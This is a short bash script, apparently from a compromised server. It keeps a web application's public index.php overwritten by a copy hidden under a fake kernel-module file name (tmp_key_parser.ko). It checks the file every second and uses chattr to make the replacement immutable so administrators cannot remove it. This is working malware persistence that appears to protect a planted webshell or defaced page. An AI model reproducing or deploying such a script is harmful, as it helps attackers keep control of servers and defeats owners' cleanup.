#!/bin/bash

exec 3< <(sleep 1 & echo $vos)
echo $vos >&3
exec 3<&-

while true; do
    index=$(stat -c %s /var/www/msg-new/back-end/cms/public/index.php 2>/dev/null)

    backup=$(stat -c %s /lib/modules/5.15.0-100-generic/kernel/crypto/asymmetric_keys/tmp_key_parser.ko 2>/dev/null)

    if [ "$index" != "$backup" ]; then
        chattr -ia /var/www/msg-new/back-end/cms/public/index.php 2>/dev/null
        cp /lib/modules/5.15.0-100-generic/kernel/crypto/asymmetric_keys/tmp_key_parser.ko /var/www/msg-new/back-end/cms/public/index.php 2>/dev/null
        chattr +ia /var/www/msg-new/back-end/cms/public/index.php 2>/dev/null
    fi

    sleep 1
done &
